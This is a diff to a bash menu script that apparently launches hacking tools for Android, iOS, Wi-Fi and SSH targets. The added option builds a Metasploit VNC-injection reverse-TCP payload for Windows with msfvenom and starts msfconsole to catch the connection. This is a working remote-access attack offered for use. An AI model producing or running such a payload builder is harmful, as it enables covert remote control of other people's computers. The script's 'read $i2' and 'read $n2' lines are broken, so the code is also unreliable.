@@ -19,7 +19,7 @@ echo "1. Android Exploits (first)"
 echo "2. Ios Exploits (second)"
 echo "3. Wifi hacking (third)"
 echo "4. SSH into pi (fourth)"
-#20
+echo "5. Vnc Windows (fifth)"
 read f
 if [[ "$f" == 'first' || "$f" == '1'  ]];
  then
@@ -111,8 +111,17 @@ ping $ras -c 5
 sleep 1
 ssh root@$ras
 fi
+if [[ "$f" == '5' || "$f" == 'fifth' || "$f" == 'vnc' || "$f" == 'win' ]];
+then
+echo "ip address: "
+read $i2
+echo "name: "
+read $n2
+msfvenom -p windows/vncinject/reverse_tcp lhost=$i2 lport=24 X>$n2
+msfconsole -r win_vnc.rc
+fi
+
 sleep 2
 clear
 echo bye bitcheass
 sleep 2
-
